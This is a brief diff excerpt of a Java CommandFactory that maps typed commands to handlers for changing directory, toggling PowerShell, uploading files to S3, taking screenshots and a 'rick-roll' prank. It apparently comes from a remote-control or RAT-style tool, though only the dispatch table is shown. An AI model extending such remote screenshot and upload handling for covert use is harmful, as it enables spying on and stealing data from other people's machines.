@@ -16,11 +16,14 @@ public class CommandFactory {
         List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
         String firstArgument= commands.get(0).toLowerCase();
         Map<String,Command> commandsList = new HashMap<>();
+
         commandsList.put("cd", new ChangeDirectoryCommand());
         commandsList.put("powershell", new TogglePowerShellCommand());
         commandsList.put("upload", new UploadToS3Command());
         commandsList.put("screenshot", new ScreenShotCommand());
         commandsList.put("rick-roll", new RickRollCommand());
+
+
 
 
 
